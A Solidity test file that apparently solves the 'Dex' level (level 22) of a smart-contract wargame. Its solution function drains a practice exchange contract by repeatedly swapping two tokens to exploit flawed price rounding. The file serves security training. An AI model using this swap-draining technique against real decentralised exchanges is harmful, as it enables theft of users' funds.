// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {BaseTest} from "./BaseTest.sol";
import {DexFactory} from "../src/levels/22-DexFactory.sol";
import {Dex, SwappableToken} from "../src/levels/22-Dex.sol";

contract DexSolution is BaseTest {
    function solution(address payable target_) internal override{
        Dex target = Dex(target_);
        SwappableToken tkn1 = SwappableToken(target.token1());
        SwappableToken tkn2 = SwappableToken(target.token2());
        target.approve(address(target), 1000);
        tkn2.transfer(address(target), 10);
        uint i = tkn1.balanceOf(attacker);
        while (i<100 && i>0) {
          target.swap(address(tkn1), address(tkn2), i);
          i = min(tkn2.balanceOf(attacker), tkn2.balanceOf(address(target)));
          if(i == 0 ) break;
          target.swap(address(tkn2), address(tkn1), i);
          i = min(tkn1.balanceOf(attacker), tkn1.balanceOf(address(target)));
        }
    }

    function min(uint a, uint b) private returns(uint) {
      return a > b ? b : a;
    }


    function construction() internal override returns(address payable ) {
        return payable(address(new DexFactory()));
    }
}
